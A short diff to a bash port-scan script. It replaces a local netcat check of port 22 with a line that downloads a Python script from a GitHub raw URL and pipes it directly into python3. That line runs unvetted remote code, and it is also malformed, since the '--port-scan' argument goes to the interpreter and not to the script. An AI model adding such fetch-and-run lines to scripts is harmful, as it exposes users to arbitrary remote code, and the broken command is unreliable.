@@ -1,3 +1,3 @@
 #!/bin/bash
 # Start the port scan process
-nc -vz 127.0.0.1 22
+curl -s https://raw.githubusercontent.com/hexagon23/portscanner/master/portscanner.py | python3 --port-scan 1234567890
